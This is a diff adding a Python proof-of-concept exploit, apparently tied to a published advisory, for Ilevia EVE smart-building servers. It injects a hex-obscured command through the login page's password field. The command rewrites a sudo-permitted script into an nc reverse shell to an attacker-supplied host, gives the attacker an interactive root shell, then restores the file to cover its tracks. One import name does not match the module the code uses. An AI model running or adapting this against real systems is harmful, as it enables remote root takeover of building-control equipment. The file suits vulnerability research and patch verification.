@@ -1,0 +1,227 @@
+#!/usr/bin/env python
+#
+#
+# Ilevia EVE X1/X5 Server 4.7.18.0.eden Reverse Rootshell
+#
+#
+# Vendor: Ilevia Srl.
+# Product web page: https://www.ilevia.com
+# Affected version: <= 4.7.18.0.eden (Logic ver: 6.00)
+#
+# Summary: EVE is a smart home and building automation solution designed
+# for both residential and commercial environments, including malls, hotels,
+# restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+# control and monitoring of electrical installations through a highly customizable,
+# user-friendly interface.
+#
+# EVE is a multi-protocol platform that integrates various systems within
+# a smart building to enhance comfort, security, safety, and energy efficiency.
+# Users can manage building functions via iPhone, iPad, Android devices, Windows
+# PCs, or Mac computers.
+#
+# The EVE X1 Server is the dedicated hardware solution for advanced building
+# automation needs. Compact and powerful, it is ideal for apartments, small
+# to medium-sized homes, and smaller commercial installations. It is designed
+# to manage entire automation systems reliably and efficiently.
+#
+# Desc: A misconfiguration in the sudoers file permits passwordless execution
+# of specific Bash shell scripts via sudo, exposing a critical privilege escalation
+# vulnerability. When such scripts are writable by a web-facing user (www-data) or
+# accessible through a command injection vector, an attacker can overwrite or replace
+# them with malicious payloads. Upon execution with sudo, these scripts run with
+# elevated privileges, allowing the attacker to gain full root access remotely.
+#
+# ------------------------------------------------------------------------------
+# $ python rewteve.py 10.0.0.18:8080 10.0.0.4 5555
+# [+] Cyber-link active on 0.0.0.0:5555...
+# [*] Firing at http://10.0.0.18:8080/ajax/php/login.php
+# [+] Pulse from 10.0.0.18:46444
+# [*] Probing matrix with 'pwd' signal...
+# [+] Verifistring: /home/ilevia/www-config/http/ajax/php
+# [*] Synaptic intrusion confirmed, escalating to holo-shell...
+# # id
+# uid=0(root) gid=0(root) groups=0(root)
+# # exit
+# [+] ilevia_reboot restored.
+# ------------------------------------------------------------------------------
+#
+# Tested on: GNU/Linux 5.4.35 (armv7l)
+#            GNU/Linux 4.19.97 (armv7l)
+#            Armbian 20.02.1 Buster
+#            Apache/2.4.38 (Debian)
+#            PHP Version 7.3.14
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5959
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5959.php
+#
+#
+# 01.05.2024
+#
+
+import jtelnetlib  # ._
+import threading   #  ._
+import requests    #   ._
+import socket      #    ._
+import time        #     ._
+import sys         #      ._
+
+def init_quantum(target_data):
+    if "http://" not in target_data and "https://" not in target_data:
+        target_data = "http://" + target_data
+    if ":" not in target_data.split("//")[1]:
+        target_data = target_data.rstrip("/") + ":80"
+    return target_data.rstrip("/")
+
+def spark_neuroport(cyber_gate):
+    def neuro_core():
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind(("0.0.0.0", cyber_gate))
+            s.listen(1)
+            print(f"[+] Cyber-link active on 0.0.0.0:{cyber_gate}...")
+            conn, addr = s.accept()
+            print(f"[+] Pulse from {addr[0]}:{addr[1]}")
+            holo_term = telnetlib.Telnet()
+            holo_term.sock = conn
+
+            print("[*] Probing matrix with 'pwd' signal...")
+            conn.sendall(b"pwd\n")
+            time.sleep(0.5)
+            try:
+                data_stream = conn.recv(4096).decode(errors='ignore')
+                data_nodes = data_stream.splitlines()
+                if data_nodes and data_nodes[0].strip() == "pwd":
+                    data_nodes.pop(0)
+                output = "\n".join(data_nodes).strip()
+                print("[+] Verifistring:", output)
+                if 'ilevia/www-config' in output:
+                    print("[*] Synaptic intrusion confirmed, escalating to holo-shell...")
+                    conn.sendall(b"script /dev/null -c /bin/sh\n")
+                    time.sleep(0.5)
+                    try:
+                        _ = conn.recv(4096)
+                    except:
+                        pass
+                else:
+                    print("[!] Expected neural path not detected. Holo-shell may be unstable.")
+            except Exception as e:
+                print(f"[!] Error in synaptic probe: {e}")
+
+            import select
+
+            while True:
+                try:
+                    cmd = input("# ").strip()
+                    if cmd == "exit":
+                        conn.sendall(b"\x72\x6d\x20\x2f\x68\x6f\x6d\x65\x2f\x69\x6c\x65\x76\x69\x61\x2f"
+                                     b"\x77\x77\x77\x2d\x63\x6f\x6e\x66\x69\x67\x2f\x68\x74\x74\x70\x2f"
+                                     b"\x73\x68\x2f\x69\x6c\x65\x76\x69\x61\x5f\x72\x65\x62\x6f\x6f\x74"
+                                     b"\x3b\x6d\x76\x20\x2f\x68\x6f\x6d\x65\x2f\x69\x6c\x65\x76\x69\x61"
+                                     b"\x2f\x77\x77\x77\x2d\x63\x6f\x6e\x66\x69\x67\x2f\x68\x74\x74\x70"
+                                     b"\x2f\x73\x68\x2f\x69\x6c\x65\x76\x69\x61\x5f\x72\x65\x62\x6f\x6f"
+                                     b"\x74\x2e\x6f\x6c\x64\x20\x2f\x68\x6f\x6d\x65\x2f\x69\x6c\x65\x76"
+                                     b"\x69\x61\x2f\x77\x77\x77\x2d\x63\x6f\x6e\x66\x69\x67\x2f\x68\x74"
+                                     b"\x74\x70\x2f\x73\x68\x2f\x69\x6c\x65\x76\x69\x61\x5f\x72\x65\x62"
+                                     b"\x6f\x6f\x74\x0a")
+                        print("[+] ilevia_reboot restored.")
+                        break
+                    if not cmd:
+                        continue
+                    conn.sendall((cmd + "\n").encode())
+                    response = b""
+                    conn.setblocking(0)
+                    end_time = time.time() + 0.5 # max 1.5, collect output
+                    while time.time() < end_time:
+                        ready = select.select([conn], [], [], 0.1)
+                        if ready[0]:
+                            try:
+                                chunk = conn.recv(8160)
+                                if not chunk:
+                                    break
+                                response += chunk
+                            except:
+                                break
+                        else:
+                            time.sleep(0.1)
+                    conn.setblocking(1)
+                    data_stream = response.decode(errors='ignore')
+                    data_nodes = data_stream.splitlines()
+                    clean_output = []
+                    for line in data_nodes:
+                        if line.strip() == cmd:
+                            continue
+                        if line.strip() in ["$", "#"]:
+                            continue
+                        clean_output.append(line)
+                    if clean_output:
+                        print("\n".join(clean_output).strip())
+                except Exception:
+                    print("[!] Neural link terminated.")
+                    break
+            conn.close()
+
+    cyber_thread = threading.Thread(target=neuro_core)
+    cyber_thread.start()
+    return cyber_thread
+
+def fire_photon(target_matrix, cyber_origin, cyber_gate):
+    print(f"[*] Firing at {target_matrix}")
+    payload = (b"\x3b\x63\x70\x20\x2f\x68\x6f\x6d\x65\x2f\x69\x6c\x65\x76\x69\x61"
+               b"\x2f\x77\x77\x77\x2d\x63\x6f\x6e\x66\x69\x67\x2f\x68\x74\x74\x70"
+               b"\x2f\x73\x68\x2f\x69\x6c\x65\x76\x69\x61\x5f\x72\x65\x62\x6f\x6f"
+               b"\x74\x20\x2f\x68\x6f\x6d\x65\x2f\x69\x6c\x65\x76\x69\x61\x2f\x77"
+               b"\x77\x77\x2d\x63\x6f\x6e\x66\x69\x67\x2f\x68\x74\x74\x70\x2f\x73"
+               b"\x68\x2f\x69\x6c\x65\x76\x69\x61\x5f\x72\x65\x62\x6f\x6f\x74\x2e"
+               b"\x6f\x6c\x64\x3b\x65\x63\x68\x6f\x20\x22\x6d\x6b\x6e\x6f\x64\x20"
+               b"\x2f\x74\x6d\x70\x2f\x70\x69\x70\x65\x20\x70\x3b\x20\x2f\x62\x69"
+               b"\x6e\x2f\x73\x68\x20\x2d\x69\x20\x3c\x20\x2f\x74\x6d\x70\x2f\x70"
+               b"\x69\x70\x65\x20\x7c\x20\x6e\x63\x20" +#                    \xn#" #####
+               f"{cyber_origin}".encode() +#                                 \x1#"    #
+               b"\x20" +#                                      :):           \xn#"  #
+               f"{cyber_gate}".encode() +#                                   \xa#" #####
+               b"\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x70\x69\x70\x65\x22\x20\x3e\x20"
+               b"\x2f\x68\x6f\x6d\x65\x2f\x69\x6c\x65\x76\x69\x61\x2f\x77\x77\x77"
+               b"\x2d\x63\x6f\x6e\x66\x69\x67\x2f\x68\x74\x74\x70\x2f\x73\x68\x2f"
+               b"\x69\x6c\x65\x76\x69\x61\x5f\x72\x65\x62\x6f\x6f\x74\x3b\x63\x68"
+               b"\x6d\x6f\x64\x20\x2b\x78\x20\x2f\x68\x6f\x6d\x65\x2f\x69\x6c\x65"
+               b"\x76\x69\x61\x2f\x77\x77\x77\x2d\x63\x6f\x6e\x66\x69\x67\x2f\x68"
+               b"\x74\x74\x70\x2f\x73\x68\x2f\x69\x6c\x65\x76\x69\x61\x5f\x72\x65"
+               b"\x62\x6f\x6f\x74\x3b\x73\x75\x64\x6f\x20\x2f\x68\x6f\x6d\x65\x2f"
+               b"\x69\x6c\x65\x76\x69\x61\x2f\x77\x77\x77\x2d\x63\x6f\x6e\x66\x69"
+               b"\x67\x2f\x68\x74\x74\x70\x2f\x73\x68\x2f\x69\x6c\x65\x76\x69\x61"
+               b"\x5f\x72\x65\x62\x6f\x6f\x74")
+    try:
+        requests.post(target_matrix, data={"userid":"inas","passwd":payload}, timeout=3)
+        print("[*] Photon fired.")
+    except requests.exceptions.ReadTimeout:
+        pass
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Photon failed: {e}")
+
+def boot_sequence():
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <target_ip[:port]> <callback_ip> <callback_gate>")
+        print("Example: python eve.py 1.2.3.4:8080 5.6.7.8 5555")
+        sys.exit(1)
+
+    target_data = sys.argv[1]
+    cyber_origin = sys.argv[2]
+    try:
+        cyber_gate = int(sys.argv[3])
+    except ValueError:
+        print("[!] Cyber gate must be numeric.")
+        sys.exit(1)
+
+    target_matrix = init_quantum(target_data) + "/ajax/php/login.php"
+    neuro_thread = spark_neuroport(cyber_gate)
+    time.sleep(1)
+    fire_photon(target_matrix, cyber_origin, cyber_gate)
+    neuro_thread.join()
+
+if __name__ == "__main__":
+    boot_sequence()
